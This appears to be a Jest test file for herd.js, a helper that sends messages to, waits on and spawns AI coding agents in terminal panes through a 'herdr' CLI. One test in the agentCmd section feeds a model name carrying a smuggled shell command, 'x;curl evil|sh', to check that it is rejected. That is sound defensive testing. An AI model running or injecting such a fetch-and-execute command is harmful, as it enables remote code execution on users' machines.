const h = require('../skills/herdr/scripts/herd.js');

const AGENTS = {
  result: {
    agents: [
      { name: 'sly', agent: 'claude', pane_id: 'w1:p1', workspace_id: 'w1', agent_status: 'idle' },
      { name: 'jay', agent: 'codex', pane_id: 'w1:p2', workspace_id: 'w1', agent_status: 'working' },
      { name: 'tim', agent: 'opencode', pane_id: 'w2:p1', workspace_id: 'w2', agent_status: 'done' },
      { pane_id: 'w3:p1', workspace_id: 'w3', agent_status: 'idle' }, // unnamed
    ],
  },
};

describe('pane', () => {
  test('returns pane_id for a handle', () => {
    expect(h.pane(AGENTS, 'jay')).toBe('w1:p2');
  });
  test('undefined for unknown handle', () => {
    expect(h.pane(AGENTS, 'nope')).toBeUndefined();
  });
});

describe('status', () => {
  test('by handle', () => { expect(h.status(AGENTS, 'tim')).toBe('done'); });
  test('by pane_id', () => { expect(h.status(AGENTS, 'w1:p1')).toBe('idle'); });
});

describe('members', () => {
  test('all named handles when no workspace', () => {
    expect(h.members(AGENTS).sort()).toEqual(['jay', 'sly', 'tim']);
  });
  test('filtered by workspace_id', () => {
    expect(h.members(AGENTS, 'w1').sort()).toEqual(['jay', 'sly']);
  });
});

describe('submitKeys', () => {
  test('codex panes get two Enters', () => {
    expect(h.submitKeys(AGENTS, 'jay')).toEqual(['Enter', 'Enter']);
  });
  test('non-codex panes get one Enter', () => {
    expect(h.submitKeys(AGENTS, 'sly')).toEqual(['Enter']);
  });
  test('unknown target returns no keys', () => {
    expect(h.submitKeys(AGENTS, 'nope')).toEqual([]);
  });
});

describe('format', () => {
  test('arrays join by newline', () => { expect(h.format(['a', 'b'])).toBe('a\nb'); });
  test('null/undefined -> empty string', () => {
    expect(h.format(undefined)).toBe('');
    expect(h.format(null)).toBe('');
  });
  test('scalars stringified', () => { expect(h.format('w7')).toBe('w7'); });
});

// The helper is stdin-free: every verb fetches its own state via `herdr`.
describe('dispatch (self-contained verbs)', () => {
  const deps = () => {
    const calls = [];
    return { calls, deps: { run: (f, a) => { calls.push([f, ...a]); return JSON.stringify(AGENTS); } } };
  };

  test('status fetches the agent list itself', () => {
    const { calls, deps: d } = deps();
    expect(h.dispatch(['status', 'tim'], d)).toBe('done');
    expect(calls).toEqual([['herdr', 'agent', 'list']]);
  });
  test('members --workspace fetches and filters', () => {
    const { deps: d } = deps();
    expect(h.dispatch(['members', '--workspace', 'w2'], d)).toEqual(['tim']);
  });
  test('removed verbs (pane/field/submit-keys) are unknown commands', () => {
    for (const verb of [['pane', 'jay'], ['field', 'result.x'], ['submit-keys', 'jay']]) {
      expect(() => h.dispatch(verb, deps().deps)).toThrow(/unknown command/);
    }
  });
  test('throws on unknown command', () => {
    expect(() => h.dispatch(['bogus'], deps().deps)).toThrow(/unknown command/);
  });
});

describe('parseWait', () => {
  test('defaults: idle, 45s, 1s interval', () => {
    expect(h.parseWait(['jay'])).toEqual({ handle: 'jay', statuses: ['idle'], timeout: 45000, interval: 1000 });
  });
  test('comma statuses and overrides', () => {
    expect(h.parseWait(['jay', '--status', 'idle,done', '--timeout', '9000', '--interval', '250']))
      .toEqual({ handle: 'jay', statuses: ['idle', 'done'], timeout: 9000, interval: 250 });
  });
});

describe('waitCmd', () => {
  test('returns as soon as the status matches one of the set', () => {
    const seq = ['working', 'working', 'done']; let i = 0;
    const deps = {
      run: () => JSON.stringify({ result: { agents: [{ name: 'jay', agent_status: seq[i++] }] } }),
      sleep: () => {}, now: () => 0,
    };
    expect(h.waitCmd(['jay', '--status', 'idle,done', '--interval', '1'], deps)).toBe('done');
  });
  test('throws on timeout, reporting the last seen status', () => {
    let t = 0;
    const deps = {
      run: () => JSON.stringify({ result: { agents: [{ name: 'jay', agent_status: 'working' }] } }),
      sleep: () => {}, now: () => (t += 1000),
    };
    expect(() => h.waitCmd(['jay', '--timeout', '1500', '--interval', '1'], deps))
      .toThrow(/wait timeout: jay is working, want idle/);
  });
});

describe('resolveSelf', () => {
  const DATA = { result: { agents: [
    { name: 'paul', pane_id: 'w1M:p5' },
    { name: 'cal', pane_id: 'w1M:p4', focused: true },
  ] } };

  test('override wins over everything', () => {
    expect(h.resolveSelf(DATA, 'kris', { HERDR_PANE_ID: 'w1M:p5' })).toBe('kris');
  });
  test('resolves the executing pane from HERDR_PANE_ID, not the focused agent', () => {
    expect(h.resolveSelf(DATA, undefined, { HERDR_PANE_ID: 'w1M:p5' })).toBe('paul');
  });
  test('falls back to the focused agent when HERDR_PANE_ID is absent', () => {
    expect(h.resolveSelf(DATA, undefined, {})).toBe('cal');
  });
  test('falls back to the focused agent when HERDR_PANE_ID matches no agent', () => {
    expect(h.resolveSelf(DATA, undefined, { HERDR_PANE_ID: 'w9:p9' })).toBe('cal');
  });
});

// Deterministic send: type -> confirm the composer ingested the text
// (wait output) -> submit keys -> confirm the turn started (agent wait).
describe('sendCmd', () => {
  // statuses: sequence served by successive `agent list` calls
  // ingest: 'ok' | 'timeout' (wait output result)
  // turns: per-attempt `agent wait --status working` results, 'ok' | 'timeout'
  function runner({ focused, statuses = ['idle'], ingest = 'ok', turns = ['ok'] } = {}) {
    const calls = [];
    let li = 0;
    let ti = 0;
    const list = () => {
      const st = statuses[Math.min(li++, statuses.length - 1)];
      return JSON.stringify({ result: { agents: [
        { name: 'jay', agent: 'claude', pane_id: 'w1:p2', agent_status: st },
        { name: 'sly', agent: 'claude', pane_id: 'w1:p1', focused: !!focused },
        { name: 'cod', agent: 'codex', pane_id: 'w1:p3', agent_status: st },
      ] } });
    };
    const run = (f, a) => {
      calls.push([f, ...a]);
      if (a[0] === 'agent' && a[1] === 'list') return list();
      if (a[0] === 'wait' && a[1] === 'output') {
        if (ingest === 'timeout') throw new Error('wait timeout');
        return '';
      }
      if (a[0] === 'agent' && a[1] === 'wait') {
        const r = turns[Math.min(ti++, turns.length - 1)];
        if (r === 'timeout') throw new Error('wait timeout');
        return '';
      }
      return '';
    };
    const submits = () => calls.filter((c) => c[1] === 'pane' && c[2] === 'send-keys');
    return { deps: { run, env: {} }, calls, submits };
  }

  test('happy path: exact deterministic sequence, no polling', () => {
    const { deps, calls } = runner();
    expect(h.sendCmd(['jay', 'rerun the test'], deps))
      .toEqual({ result: { type: 'ok' }, pane: 'w1:p2', sent: 'rerun the test', submitted: true });
    expect(calls).toEqual([
      ['herdr', 'agent', 'list'],
      ['herdr', 'agent', 'send', 'jay', 'rerun the test'],
      ['herdr', 'wait', 'output', 'w1:p2', '--match', 'rerun the test',
        '--source', 'recent-unwrapped', '--timeout', '5000'],
      ['herdr', 'pane', 'send-keys', 'w1:p2', 'Enter'],
      ['herdr', 'agent', 'wait', 'jay', '--status', 'working', '--timeout', '4000'],
    ]);
  });

  test('codex recipient gets two Enters via submitKeys', () => {
    const { deps, submits } = runner();
    h.sendCmd(['cod', 'hello'], deps);
    expect(submits()).toEqual([
      ['herdr', 'pane', 'send-keys', 'w1:p3', 'Enter'],
      ['herdr', 'pane', 'send-keys', 'w1:p3', 'Enter'],
    ]);
  });

  test('long message matches on its last 60 characters', () => {
    const body = 'x'.repeat(50) + 'y'.repeat(50);
    const { deps, calls } = runner();
    h.sendCmd(['jay', body], deps);
    const wait = calls.find((c) => c[1] === 'wait' && c[2] === 'output');
    expect(wait[5]).toBe(body.slice(-60));
    expect(wait[5]).toHaveLength(60);
  });

  test('ingest confirm timing out does not abort the submit', () => {
    const { deps, submits } = runner({ ingest: 'timeout' });
    expect(h.sendCmd(['jay', 'hi'], deps).submitted).toBe(true);
    expect(submits()).toHaveLength(1);
  });

  test('fast turn: agent wait misses but the status changed -> submitted, no retry', () => {
    // wait times out; the follow-up list shows idle -> done
    const { deps, submits } = runner({ statuses: ['idle', 'done'], turns: ['timeout'] });
    expect(h.sendCmd(['jay', 'quick one'], deps).submitted).toBe(true);
    expect(submits()).toHaveLength(1);
  });

  test('dropped submit is retried once, then reported submitted:false', () => {
    const { deps, submits } = runner({ statuses: ['idle'], turns: ['timeout', 'timeout'] });
    expect(h.sendCmd(['cod', 'hello'], deps).submitted).toBe(false);
    expect(submits()).toHaveLength(4); // 2 Enters x 2 attempts, no further polling
  });

  test('--reply --from stamps the compact protocol header', () => {
    const { deps, calls } = runner();
    expect(h.sendCmd(['jay', 'status?', '--reply', '--from', 'sly'], deps).sent)
      .toBe('[from sly reply] status?');
    expect(calls).toContainEqual(['herdr', 'agent', 'send', 'jay', '[from sly reply] status?']);
  });

  test('--fyi resolves <self> from the executing pane, not the focused agent', () => {
    const { deps } = runner({ focused: true });
    deps.env = { HERDR_PANE_ID: 'w1:p2' }; // jay is running the send
    expect(h.sendCmd(['cod', 'heads up', '--fyi'], deps).sent).toBe('[from jay fyi] heads up');
  });

  test('does not double-prefix an already [from ...] message', () => {
    const { deps } = runner({ focused: true });
    expect(h.sendCmd(['jay', '[from sly reply] hi', '--reply'], deps).sent).toBe('[from sly reply] hi');
  });

  test('throws on unknown handle', () => {
    const { deps } = runner();
    expect(() => h.sendCmd(['ghost', 'hi'], deps)).toThrow(/no agent: ghost/);
  });

  test('--reply with no focused agent and no --from throws (no silent mis-stamp)', () => {
    const { deps } = runner();
    expect(() => h.sendCmd(['jay', 'hi', '--reply'], deps)).toThrow(/cannot resolve sender handle/);
  });

  test('--from without a value throws instead of being silently ignored', () => {
    const { deps } = runner({ focused: true });
    expect(() => h.sendCmd(['jay', 'hi', '--reply', '--from'], deps)).toThrow(/--from needs a value/);
  });
});

describe('sendWaitReadCmd', () => {
  function runner() {
    const calls = [];
    const seq = ['working', 'done'];
    let i = 0;
    const run = (f, a) => {
      calls.push([f, ...a]);
      if (a[0] === 'agent' && a[1] === 'list') {
        return JSON.stringify({ result: { agents: [
          { name: 'gus', agent: 'claude', pane_id: 'w1:p2', agent_status: seq[Math.min(i++, seq.length - 1)] },
          { name: 'sly', agent: 'claude', pane_id: 'w1:p1', focused: true },
        ] } });
      }
      if (a[0] === 'pane' && a[1] === 'read') return 'REVIEW: looks good\n';
      return '';
    };
    return { calls, deps: { run, sleep: () => {}, now: () => 0 } };
  }

  test('sends, waits for not-working, reads recent, returns the text', () => {
    const { calls, deps } = runner();
    const out = h.sendWaitReadCmd(['gus', 'review please', '--reply', '--from', 'sly', '--lines', '50'], deps);
    expect(out).toBe('REVIEW: looks good\n');
    expect(calls).toContainEqual(['herdr', 'agent', 'send', 'gus', '[from sly reply] review please']);
    expect(calls).toContainEqual(['herdr', 'pane', 'read', 'w1:p2', '--source', 'recent', '--lines', '50']);
  });
});

// agent verb: tab create -> agent start --tab (named at start, no wait/rename)
// -> close the leftover tab root pane -> wait until the agent is ready.
describe('agentCmd', () => {
  const TAB = JSON.stringify({ result: { tab: { tab_id: 'wR:t2' }, root_pane: { pane_id: 'wR:p2' } } });
  const START = JSON.stringify({ result: { agent: { pane_id: 'wR:p9', name: 'jay', tab_id: 'wR:t2' } } });
  function runner(existing = []) {
    const calls = [];
    const run = (f, a) => {
      calls.push([f, ...a]);
      if (a[0] === 'agent' && a[1] === 'list') {
        return JSON.stringify({ result: { agents: existing.map((name) => ({ name })) } });
      }
      if (a[0] === 'tab' && a[1] === 'create') return TAB;
      if (a[0] === 'agent' && a[1] === 'start') return START;
      return '';
    };
    return { run, calls };
  }

  test('codex agent: preflight, tab create -> agent start --tab -> close root -> wait idle', () => {
    const { run, calls } = runner();
    const out = h.agentCmd(['codex', 'jay', '--workspace', 'wR', '--cwd', '/wt/x'], { run });
    expect(out).toEqual({ handle: 'jay', model: 'codex', pane_id: 'wR:p9', tab: 'wR:t2' });
    expect(calls).toEqual([
      ['herdr', 'agent', 'list'],
      ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'jay ◇', '--no-focus'],
      ['herdr', 'agent', 'start', 'jay', '--tab', 'wR:t2', '--cwd', '/wt/x', '--no-focus', '--', 'codex'],
      ['herdr', 'pane', 'close', 'wR:p2'],
      ['herdr', 'agent', 'wait', 'jay', '--status', 'idle', '--timeout', '45000'],
    ]);
  });

  test('preflight rejects a globally taken handle without creating a tab', () => {
    const { run, calls } = runner(['jay']);
    expect(() => h.agentCmd(['codex', 'jay', '--workspace', 'wR', '--cwd', '/wt/x'], { run }))
      .toThrow(/handle already taken: jay/);
    expect(calls.some((c) => c[1] === 'tab' && c[2] === 'create')).toBe(false);
  });

  test('--timeout overrides the readiness wait', () => {
    const { run, calls } = runner();
    h.agentCmd(['claude', 'sly', '--workspace', 'wR', '--cwd', '/wt/x', '--timeout', '9000'], { run });
    expect(calls).toContainEqual(['herdr', 'agent', 'wait', 'sly', '--status', 'idle', '--timeout', '9000']);
  });

  test('missing --cwd throws', () => {
    const { run } = runner();
    expect(() => h.agentCmd(['claude', 'sly', '--workspace', 'wR'], { run }))
      .toThrow(/--workspace and --cwd are required/);
  });

  test('opencode agent starts with the argv vector (no shell string)', () => {
    const { run, calls } = runner();
    h.agentCmd(['opencode', 'bob:ollama/qwen2.5:7b', '--workspace', 'wR', '--cwd', '/wt/x'], { run });
    expect(calls).toContainEqual(
      ['herdr', 'agent', 'start', 'bob', '--tab', 'wR:t2', '--cwd', '/wt/x', '--no-focus',
        '--', 'opencode', '-m', 'ollama/qwen2.5:7b']);
  });

  test('opencode agent with an unsafe model is rejected before any herdr call', () => {
    const { run, calls } = runner();
    expect(() => h.agentCmd(['opencode', 'bob:x;curl evil|sh', '--workspace', 'wR', '--cwd', '/wt/x'], { run }))
      .toThrow(/unsafe characters/);
    expect(calls).toEqual([]);
  });
});

describe('defaultDeps', () => {
  test('sleep blocks for the requested ms without spawning a subprocess', () => {
    const deps = h.defaultDeps();
    expect(typeof deps.sleep).toBe('function');
    const t0 = Date.now();
    deps.sleep(15);
    expect(Date.now() - t0).toBeGreaterThanOrEqual(10);
  });
});

describe('usage / --help', () => {
  test('send --help prints usage instead of resolving --help as a handle', () => {
    const calls = [];
    const deps = { run: (f, a) => { calls.push([f, ...a]); return '{}'; } };
    const out = h.dispatch(['send', '--help'], deps);
    expect(out).toMatch(/usage: herd\.js/);
    expect(calls).toEqual([]); // short-circuits before any herdr call
  });
  test('bare --help, -h, and no verb print usage', () => {
    expect(h.dispatch(['--help'], {})).toMatch(/usage: herd\.js/);
    expect(h.dispatch(['-h'], {})).toMatch(/usage: herd\.js/);
    expect(h.dispatch([], {})).toMatch(/usage: herd\.js/);
  });
  test('usage no longer documents stdin or piping', () => {
    expect(h.usage()).not.toMatch(/stdin|pipe/i);
  });
  test('usage warns that the native wait takes a single status, not a comma list', () => {
    expect(h.usage()).toMatch(/herdr wait agent-status.*one\b/i);
  });
});

describe('herd.js main wiring (child process)', () => {
  const path = require('path');
  const { execFileSync, spawn } = require('child_process');
  const HERD = path.join(__dirname, '..', 'skills', 'herdr', 'scripts', 'herd.js');

  test('unknown verb exits non-zero with a stderr diagnostic (deps wired)', () => {
    let err;
    try {
      execFileSync('node', [HERD, 'bogus'], { encoding: 'utf8', stdio: 'pipe', input: '' });
    } catch (e) { err = e; }
    expect(err).toBeDefined();
    expect(err.status).toBe(1);
    expect(String(err.stderr)).toMatch(/^herd: unknown command/m);
  });
  test('send --help exits 0 with usage on stdout', () => {
    const out = execFileSync('node', [HERD, 'send', '--help'], { encoding: 'utf8', stdio: 'pipe', input: '' });
    expect(out).toMatch(/usage: herd\.js/);
  });

  // Harnesses like the Claude Code Bash tool keep the child's stdin open (a
  // socket that never sends EOF). The helper must never read stdin, so every
  // verb dispatches immediately.
  function exitsWithStdinOpen(argv) {
    // PATH without herdr: dispatch fails fast (ENOENT) instead of touching a
    // live server, so the only way this test times out is a stdin read.
    const child = spawn(process.execPath, [HERD, ...argv], {
      stdio: ['pipe', 'ignore', 'pipe'],
      env: { ...process.env, PATH: '/usr/bin:/bin' },
    });
    // deliberately never close child.stdin
    return new Promise((resolve) => {
      const timer = setTimeout(() => { child.kill('SIGKILL'); resolve(false); }, 4000);
      child.on('exit', () => { clearTimeout(timer); resolve(true); });
    });
  }

  test('action verbs dispatch without waiting for stdin EOF', async () => {
    expect(await exitsWithStdinOpen(['send', 'no-such-agent', 'hi'])).toBe(true);
  });
  test('read verbs dispatch without waiting for stdin EOF (stdin is never read)', async () => {
    expect(await exitsWithStdinOpen(['status', 'no-such-agent'])).toBe(true);
  });
});
